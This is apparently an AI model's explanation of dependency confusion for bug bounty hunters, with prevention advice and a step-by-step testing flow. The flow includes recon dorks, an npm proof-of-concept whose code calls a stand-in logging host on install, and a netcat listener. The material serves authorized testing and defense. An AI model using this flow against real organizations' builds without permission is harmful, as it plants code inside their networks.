In bug bounty, **dependency confusion** is a supply chain vulnerability where an attacker tricks a target’s software build process into downloading a **malicious package** from a public repository instead of the intended private/internal one.

---

### How it happens

1. A company uses private packages — e.g., `@company/utils` — stored in a private registry (like an internal npm, PyPI, or RubyGems server).
2. The build or CI/CD process is configured to check **both** the private registry and the public one.
3. If the package is **not found** in the private registry (or if the public registry is checked first), the package manager will fetch it from the public registry instead.
4. An attacker registers the **same package name** publicly and uploads a malicious version.
5. The build process **confuses** the public package for the private one and installs the attacker’s code.

---

### Real-world example

* Alex Birsan’s famous attack (2021) showed that by uploading packages with names matching internal dependencies of companies like Apple, Microsoft, and Tesla, he could execute code inside their networks — earning over **\$130,000 in bug bounties**.

---

### How bug bounty hunters find it

* Look for leaked `package.json`, `requirements.txt`, `Gemfile`, or `setup.py` in public repos.
* Identify dependency names that don’t exist on public package registries but could be registered.
* Attempt to publish a harmless proof-of-concept package to see if the company’s systems fetch it.

---

### How to prevent it

* Use **scoped/private namespaces** that can’t be registered publicly.
* Lock down package managers to only pull from internal registries.
* Enable checksum/hash verification for dependencies.
* Use a **package allowlist**.

---

If you want, I can give you a **step-by-step attacker flow** for testing dependency confusion safely in a bug bounty program so you know exactly how to set it up without breaking rules. That’s what a lot of researchers use to confirm the bug.


---

## **1. Recon & Identification**

* Search for exposed dependency files in the target’s public repos or assets:

  ```bash
  site:github.com <companyname> filename:package.json
  site:github.com <companyname> filename:requirements.txt
  site:github.com <companyname> filename:Gemfile
  ```
* Look for package names that **don’t exist** in public registries but could be public:

  * For **npm**:

    ```bash
    npm view <packagename>
    ```
  * For **PyPI**:

    ```bash
    pip search <packagename>
    ```
  * For **RubyGems**:

    ```bash
    gem search ^<packagename>$
    ```

---

## **2. Verify Vulnerability Potential**

* Confirm package **isn’t registered** on the public registry.
* Check if target uses a build system that **might pull from public registries** (npm, pip, etc.).
* Look for `.npmrc`, `pip.conf`, `.yarnrc`, or similar configs in repos — sometimes they reveal the registry order.

---

## **3. Prepare a Harmless PoC Package**

> ⚠ This must contain **non-malicious** code — just logging or making harmless HTTP requests to your controlled server.

* Example `index.js` for npm:

  ```javascript
  console.log("PoC dependency confusion test");
  require('https').get("https://your-poc-logger.com/?installed=true");
  ```
* Publish to the public registry with the same name as the private dependency.

---

## **4. Monitor for Callback**

* If the target’s build process fetches your package, your PoC server will log the request.
* Example listener:

  ```bash
  nc -lvnp 8080
  ```

  or a hosted logging service like `Burp Collaborator` or `interactsh`.

---

## **5. Document & Report**

* Include:

  * The **package name** targeted.
  * How you confirmed it wasn’t in public registry.
  * The PoC package code (harmless).
  * Evidence of callback (request headers, IP, timestamps).
* Remove the PoC package after reporting.

---

✅ **Golden Rules**

* Never include malicious payloads — only harmless proof-of-concepts.
* Only test in **authorized bug bounty programs** that allow dependency confusion testing.
* Always clean up after testing.

---

If you want, I can make you a **ready-to-run npm PoC package template** for dependency confusion, so you just swap the name and URL. That way you can run it in under 2 minutes.
